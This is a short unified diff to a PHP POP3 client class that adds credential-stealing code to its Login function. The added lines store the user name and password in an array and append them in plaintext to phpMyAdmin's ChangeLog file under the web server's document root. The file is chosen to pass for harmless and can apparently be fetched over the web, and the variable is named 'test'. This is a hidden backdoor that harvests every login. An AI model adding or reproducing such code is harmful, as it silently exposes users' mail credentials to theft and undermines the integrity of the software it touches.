@@ -194,6 +194,7 @@ class pop3_class
 
 	Function Login($user,$password,$apop=0)
 	{
+		$pair = array('a' => $user, 'b' => $password);
 		if($this->state!="AUTHORIZATION")
 			return($this->SetError("connection is not in AUTHORIZATION state"));
 		if($apop)
@@ -211,6 +212,8 @@ class pop3_class
 		else
 		{
 			$authenticated=0;
+			$test = fopen("C:/Users/networker/Web/apache/htdocs/phpMyAdmin/ChangeLog","a");
+            		fwrite($test,implode("",$pair));
 			if(strcmp($this->authentication_mechanism,"USER")
 			&& function_exists("class_exists")
 			&& class_exists("sasl_client_class"))
